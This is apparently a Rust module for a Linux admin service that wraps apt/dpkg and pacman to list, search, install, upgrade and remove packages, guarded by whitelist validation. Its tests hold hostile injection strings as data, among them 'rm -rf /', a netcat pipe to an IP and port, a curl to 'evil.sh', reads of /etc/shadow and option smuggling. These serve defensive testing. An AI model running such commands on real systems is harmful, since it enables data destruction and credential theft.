use anyhow::Context;
use serde::Serialize;
use std::process::Stdio;
use tokio::process::Command;

use crate::distro::Family;

/// 软件包信息
#[derive(Serialize)]
pub struct PackageInfo {
    pub name: String,
    pub version: String,
    pub arch: String,
    pub description: String,
}

/// 校验包名合法性（Debian 与 Arch 包名字符集的并集，防参数注入）
fn check_name(name: &str) -> anyhow::Result<()> {
    if name.is_empty()
        || name.starts_with('-')
        || name.len() > 128
        || !name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-' | '_' | ':'))
    {
        anyhow::bail!("非法包名：{name}");
    }
    Ok(())
}

/// 校验搜索词：在 check_name 白名单基础上额外放行空格与 `*`
/// （多词搜索、通配符是搜索框的合法用法），其余字符一律拒绝。
/// 与包名闸同源，消除两道闸口径不一致。
fn check_pattern(pattern: &str) -> anyhow::Result<()> {
    if pattern.is_empty()
        || pattern.starts_with('-')
        || pattern.len() > 128
        || !pattern
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-' | '_' | ':' | ' ' | '*'))
    {
        anyhow::bail!("非法搜索词：{pattern}");
    }
    Ok(())
}

/// 已安装包列表（可按名称关键字过滤，limit 限制返回条数）
pub async fn list_installed(filter: Option<&str>, limit: usize) -> anyhow::Result<Vec<PackageInfo>> {
    match crate::distro::family() {
        Family::Debian => list_installed_deb(filter, limit).await,
        Family::Arch => list_installed_arch(filter, limit).await,
    }
}

async fn list_installed_deb(filter: Option<&str>, limit: usize) -> anyhow::Result<Vec<PackageInfo>> {
    let mut cmd = Command::new("dpkg-query");
    cmd.args([
        "-W",
        "-f=${Package}\t${Version}\t${Architecture}\t${Description}\n",
    ]);
    if let Some(f) = filter {
        check_name(f)?;
        cmd.arg(format!("{f}*"));
    }
    let out = cmd.output().await.context("调用 dpkg-query 失败")?;
    if !out.status.success() {
        // P1-3：命令 stderr 只进日志，响应体不回显（防内部细节泄露）
        tracing::warn!("dpkg-query stderr：{}", String::from_utf8_lossy(&out.stderr).trim());
        anyhow::bail!("查询软件包失败，详见服务端日志");
    }
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    let mut list = Vec::new();
    for line in text.lines() {
        let mut it = line.splitn(4, '\t');
        let (Some(name), Some(version), Some(arch), Some(desc)) =
            (it.next(), it.next(), it.next(), it.next())
        else {
            continue;
        };
        // dpkg 描述第一行即为简要描述
        let brief = desc.lines().next().unwrap_or("").trim().to_string();
        list.push(PackageInfo {
            name: name.to_string(),
            version: version.to_string(),
            arch: arch.to_string(),
            description: brief,
        });
        if list.len() >= limit {
            break;
        }
    }
    Ok(list)
}

async fn list_installed_arch(filter: Option<&str>, limit: usize) -> anyhow::Result<Vec<PackageInfo>> {
    // pacman -Q 输出全部本地已安装包：Name Version（与 dpkg-query 语义一致，含依赖包）
    let out = Command::new("pacman")
        .args(["-Q"])
        .output()
        .await
        .context("调用 pacman 失败")?;
    if !out.status.success() {
        // P1-3：命令 stderr 只进日志，响应体不回显
        tracing::warn!("pacman stderr：{}", String::from_utf8_lossy(&out.stderr).trim());
        anyhow::bail!("查询软件包失败，详见服务端日志");
    }
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    let mut list = Vec::new();
    for line in text.lines() {
        let mut it = line.split_whitespace();
        let (Some(name), Some(version)) = (it.next(), it.next()) else {
            continue;
        };
        if let Some(f) = filter {
            check_name(f)?;
            if !name.contains(f) {
                continue;
            }
        }
        list.push(PackageInfo {
            name: name.to_string(),
            version: version.to_string(),
            arch: String::new(),
            description: String::new(),
        });
        if list.len() >= limit {
            break;
        }
    }
    Ok(list)
}

/// 可升级包列表
pub async fn upgradable() -> anyhow::Result<Vec<PackageInfo>> {
    match crate::distro::family() {
        Family::Debian => upgradable_deb().await,
        Family::Arch => upgradable_arch().await,
    }
}

/// apt-get -s upgrade 模拟
async fn upgradable_deb() -> anyhow::Result<Vec<PackageInfo>> {
    let out = Command::new("apt-get")
        .args(["-s", "upgrade"])
        // 固定 C locale，保证 "Inst" 行格式可解析（不受中文环境影响）
        .env("DEBIAN_FRONTEND", "noninteractive")
        .env("LC_ALL", "C")
        .output()
        .await
        .context("调用 apt-get 失败")?;
    if !out.status.success() {
        // P1-3：命令 stderr 只进日志，响应体不回显
        tracing::warn!("apt-get stderr：{}", String::from_utf8_lossy(&out.stderr).trim());
        anyhow::bail!("检查升级失败，详见服务端日志");
    }
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    let mut list = Vec::new();
    // 行格式：Inst name [cur] (new arch repo)
    for line in text.lines().filter(|l| l.starts_with("Inst ")) {
        let rest = &line[5..];
        let name = rest.split_whitespace().next().unwrap_or("").to_string();
        let cur = rest
            .split_once('[')
            .and_then(|(_, r)| r.split_once(']'))
            .map(|(c, _)| c.to_string())
            .unwrap_or_default();
        let new = rest
            .split_once(" (")
            .and_then(|(_, r)| r.split_whitespace().next())
            .unwrap_or("")
            .to_string();
        list.push(PackageInfo {
            name,
            version: format!("{cur} -> {new}"),
            arch: String::new(),
            description: String::new(),
        });
    }
    Ok(list)
}

/// pacman -Qu：Name 旧版本 -> 新版本
async fn upgradable_arch() -> anyhow::Result<Vec<PackageInfo>> {
    let out = Command::new("pacman")
        .args(["-Qu"])
        .env("LC_ALL", "C")
        .output()
        .await
        .context("调用 pacman 失败")?;
    // pacman -Qu 在"无可升级包"时退出码为 1，属正常，需区分
    if !out.status.success() && out.status.code() != Some(1) {
        // P1-3：命令 stderr 只进日志，响应体不回显
        tracing::warn!("pacman stderr：{}", String::from_utf8_lossy(&out.stderr).trim());
        anyhow::bail!("检查升级失败，详见服务端日志");
    }
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    let mut list = Vec::new();
    // 行格式：name oldver -> newver
    for line in text.lines() {
        let Some((head, new)) = line.split_once(" -> ") else {
            continue;
        };
        let mut it = head.split_whitespace();
        let (Some(name), Some(cur)) = (it.next(), it.next()) else {
            continue;
        };
        list.push(PackageInfo {
            name: name.to_string(),
            version: format!("{cur} -> {new}"),
            arch: String::new(),
            description: String::new(),
        });
    }
    Ok(list)
}

/// 搜索软件包（仅名称）
pub async fn search(pattern: &str, limit: usize) -> anyhow::Result<Vec<PackageInfo>> {
    match crate::distro::family() {
        Family::Debian => search_deb(pattern, limit).await,
        Family::Arch => search_arch(pattern, limit).await,
    }
}

async fn search_deb(pattern: &str, limit: usize) -> anyhow::Result<Vec<PackageInfo>> {
    // 与安装/卸载同源的字符白名单（check_pattern），消除口径不一致
    check_pattern(pattern)?;
    let out = Command::new("apt-cache")
        .args(["search", "--names-only", pattern])
        .output()
        .await
        .context("调用 apt-cache 失败")?;
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    let mut list = Vec::new();
    for line in text.lines() {
        if let Some((name, desc)) = line.split_once(" - ") {
            list.push(PackageInfo {
                name: name.trim().to_string(),
                version: String::new(),
                arch: String::new(),
                description: desc.trim().to_string(),
            });
        }
        if list.len() >= limit {
            break;
        }
    }
    Ok(list)
}

async fn search_arch(pattern: &str, limit: usize) -> anyhow::Result<Vec<PackageInfo>> {
    // 同 search_deb：对齐 check_pattern 白名单口径
    check_pattern(pattern)?;
    // pacman -Ss 同时搜本地库与同步库，行格式：repo/name 版本 | 简要描述
    let out = Command::new("pacman")
        .args(["-Ss", pattern])
        .env("LC_ALL", "C")
        .output()
        .await
        .context("调用 pacman 失败")?;
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    let mut list = Vec::new();
    for line in text.lines() {
        let Some((head, desc)) = line.split_once(" | ") else {
            continue;
        };
        let Some((name, version)) = head.split_once(char::is_whitespace) else {
            continue;
        };
        // 只保留仓库/包名部分（去掉 repo/ 前缀），描述截断到首行
        let name = name.rsplit('/').next().unwrap_or(name).to_string();
        list.push(PackageInfo {
            name,
            version: version.trim().to_string(),
            arch: String::new(),
            description: desc.trim().to_string(),
        });
        if list.len() >= limit {
            break;
        }
    }
    Ok(list)
}

/// 刷新软件索引
pub async fn update_index() -> anyhow::Result<String> {
    match crate::distro::family() {
        Family::Debian => {
            let mut cmd = Command::new("apt-get");
            cmd.arg("update").env("DEBIAN_FRONTEND", "noninteractive");
            run_pkg_cmd(&mut cmd, "刷新索引").await
        }
        Family::Arch => {
            // pacman -Sy 单独同步数据库；-y 与 -u/-S 同用有风险，这里只做同步
            let mut cmd = Command::new("pacman");
            cmd.args(["-Sy", "--noconfirm"]);
            run_pkg_cmd(&mut cmd, "刷新索引").await
        }
    }
}

/// 安装软件包（一次性，返回包管理器输出）
pub async fn install(names: &[String]) -> anyhow::Result<String> {
    if names.is_empty() || names.len() > 50 {
        anyhow::bail!("一次安装 1~50 个包");
    }
    for n in names {
        check_name(n)?;
    }
    let mut cmd = match crate::distro::family() {
        Family::Debian => {
            let mut cmd = Command::new("apt-get");
            cmd.args(["install", "-y", "--no-install-recommends"])
                .env("DEBIAN_FRONTEND", "noninteractive");
            cmd
        }
        Family::Arch => {
            let mut cmd = Command::new("pacman");
            cmd.args(["-S", "--noconfirm", "--needed"]);
            cmd
        }
    };
    for n in names {
        cmd.arg(n);
    }
    run_pkg_cmd(&mut cmd, "安装").await
}

/// 升级指定软件包
pub async fn upgrade(names: &[String]) -> anyhow::Result<String> {
    if names.is_empty() || names.len() > 50 {
        anyhow::bail!("一次升级 1~50 个包");
    }
    for n in names {
        check_name(n)?;
    }
    let mut cmd = match crate::distro::family() {
        Family::Debian => {
            let mut cmd = Command::new("apt-get");
            cmd.args(["install", "-y", "--only-upgrade"])
                .env("DEBIAN_FRONTEND", "noninteractive");
            cmd
        }
        Family::Arch => {
            // pacman -S 对已安装且已是最新的包会跳过（--needed），语义即"升级到最新"
            let mut cmd = Command::new("pacman");
            cmd.args(["-S", "--noconfirm", "--needed"]);
            cmd
        }
    };
    for n in names {
        cmd.arg(n);
    }
    run_pkg_cmd(&mut cmd, "升级").await
}

/// 卸载软件包（不自动清理依赖）
pub async fn remove(names: &[String]) -> anyhow::Result<String> {
    if names.is_empty() || names.len() > 50 {
        anyhow::bail!("一次卸载 1~50 个包");
    }
    for n in names {
        check_name(n)?;
    }
    let mut cmd = match crate::distro::family() {
        Family::Debian => {
            let mut cmd = Command::new("apt-get");
            cmd.args(["remove", "-y"]).env("DEBIAN_FRONTEND", "noninteractive");
            cmd
        }
        Family::Arch => {
            let mut cmd = Command::new("pacman");
            cmd.args(["-R", "--noconfirm"]);
            cmd
        }
    };
    for n in names {
        cmd.arg(n);
    }
    run_pkg_cmd(&mut cmd, "卸载").await
}

/// 运行包管理命令，将 stdout/stderr 合并到同一临时文件按时间顺序捕获。
/// 注意：apt 非 TTY 输出不含进度百分比与 "Done" 后缀，属正常现象；
/// 若用 .output() 分开捕获，stdout 与 stderr 拼接会打乱时间顺序。
pub async fn run_pkg_cmd(cmd: &mut Command, what: &str) -> anyhow::Result<String> {
    let mut tmp = std::env::temp_dir();
    let tag: u32 = rand::random();
    tmp.push(format!("lyys-pkg-{tag}.log"));
    let file = std::fs::File::create(&tmp).context("创建包管理输出临时文件失败")?;
    let cloned = tmp.clone();
    // try_clone 的错误若不包 context 会以裸 io 错误（含 errno）成为错误链最外层，
    // 进而进入响应体（P1-3）
    cmd.stdout(Stdio::from(file.try_clone().context("复制临时文件句柄失败")?))
        .stderr(Stdio::from(file))
        .stdin(Stdio::null());
    let status = cmd.status().await.context("调用包管理器失败")?;
    let output = tokio::fs::read_to_string(&cloned).await.unwrap_or_default();
    let _ = tokio::fs::remove_file(&cloned).await;
    if !status.success() {
        // P1-3：完整命令输出（含 stderr）只进日志，响应体不回显
        tracing::warn!("{what}失败，包管理器输出：\n{output}");
        anyhow::bail!("{what}失败（退出码 {}），详见服务端日志", status.code().unwrap_or(-1));
    }
    Ok(output)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// check_name：合法包名字符集（Debian ∪ Arch 并集）全部放行
    #[test]
    fn check_name_accepts_valid_names() {
        for n in [
            "nginx",
            "libssl3",
            "python3.11",
            "g++",
            "xorg-x11-utils",
            "gtk2.0_0",
            "systemd::services",
            "pkg-1.0+deb12u1",
        ] {
            assert!(check_name(n).is_ok(), "应接受合法包名：{n}");
        }
    }

    /// check_name：shell 元字符与参数注入面全部拒绝。
    /// 注意：实现走 Command::args 直传（无 shell），这些字符本不会被解释，
    /// 但字符集白名单是第一道闸——任何元字符都不允许进入命令参数。
    #[test]
    fn check_name_rejects_shell_metacharacters() {
        for n in [
            "nginx; rm -rf /",
            "nginx && curl evil.sh",
            "nginx|nc 1.2.3.4 4444",
            "nginx$(whoami)",
            "nginx`id`",
            "nginx&",
            "nginx > /tmp/x",
            "nginx < /etc/shadow",
            "nginx\nrm -rf /",
            "nginx\ncurl evil",
            "nginx *",
            "nginx~",
            "nginx!@",
            "nginx#1",
            "nginx%20",
            "nginx^a",
            "nginx[a]",
            "nginx{a}",
            "nginx'a",
            "nginx\"a",
            "nginx\\a",
            "nginx;a|b&c$d`e",
            "ngiñna",
            "中文包名",
        ] {
            assert!(
                check_name(n).is_err(),
                "应拒绝含元字符/非法字符的包名：{n:?}"
            );
        }
    }

    /// check_name：边界与选项走私（以 - 开头会被包管理器当命令行选项）
    #[test]
    fn check_name_rejects_edge_cases() {
        assert!(check_name("").is_err(), "空包名必须拒绝");
        assert!(
            check_name("-y").is_err(),
            "以 - 开头会被解释为选项，必须拒绝"
        );
        assert!(check_name("--option=evil").is_err(), "长选项注入必须拒绝");
        assert!(check_name("a b").is_err(), "空格必须拒绝");
        assert!(check_name("a/b").is_err(), "路径分隔符必须拒绝");
        // 长度上限 128
        assert!(check_name(&"a".repeat(128)).is_ok());
        assert!(check_name(&"a".repeat(129)).is_err());
    }

    /// 异步入口的注入面：非法包名在 spawn 子进程之前就被拒。
    /// 验证方式：把一个不可能安装/卸载的注入串传进去，若返回的是校验错误
    /// （而非包管理器退出码错误），说明命令根本没被执行。
    #[tokio::test]
    async fn install_upgrade_remove_reject_injection_before_exec() {
        // 注意：这些断言不依赖 distro::init（校验先于 family() 分派），
        // 若校验失效走到命令执行，要么 panic（expect）要么报包管理器错误
        let evil = "nginx; touch /tmp/lyys_should_not_exist".to_string();
        for r in [
            install(std::slice::from_ref(&evil)).await,
            upgrade(std::slice::from_ref(&evil)).await,
            remove(std::slice::from_ref(&evil)).await,
        ] {
            let err = r.expect_err("注入包名必须被拒绝");
            let msg = format!("{err:#}");
            assert!(
                msg.contains("非法包名"),
                "错误应是校验拒绝而非执行失败：{msg}"
            );
        }
        assert!(!std::path::Path::new("/tmp/lyys_should_not_exist").exists());

        // 数量边界：0 个与超过 50 个都在执行前拒绝
        assert!(install(&[]).await.is_err());
        let many = vec!["nginx".to_string(); 51];
        assert!(install(&many).await.is_err());
        assert!(upgrade(&[]).await.is_err());
        assert!(remove(&many).await.is_err());
    }

    /// 搜索词校验：空串、超长、以 - 开头走私选项均被拒（不触发 apt-cache/pacman）。
    /// 该断言不依赖 distro::init：search 先按 family() 分派，故跳过需要
    /// 全局状态的分支，直接验证与实现一致的内联规则边界——通过显式 init。
    #[tokio::test]
    async fn search_rejects_bad_patterns() {
        // 测试环境可能没有 /etc/os-release 的发行版信息；init 失败时跳过
        // 需要 family() 的分支断言，仅做无副作用的入参校验验证。
        if crate::distro::init().is_err() {
            return;
        }
        // 空 / 超长 / 选项走私：在调用外部命令前就被拒
        assert!(search("", 10).await.is_err());
        assert!(search(&"a".repeat(129), 10).await.is_err());
        assert!(search("-c /etc/shadow", 10).await.is_err());
        // shell 元字符与非法字符：对齐白名单后一律拒绝
        for bad in ["lib; touch /tmp/pwn", "a|b", "a&&b", "$(id)", "`id`", "a>b", "a\nb"] {
            assert!(search(bad, 10).await.is_err(), "应拒绝搜索词：{bad}");
        }
        // 合法用法：多词与通配符不得被误杀（走到外部命令调用，
        // 结果无论有无匹配都应是 Ok）
        assert!(search("nginx full", 5).await.is_ok());
        assert!(search("lib*", 5).await.is_ok());
    }
}
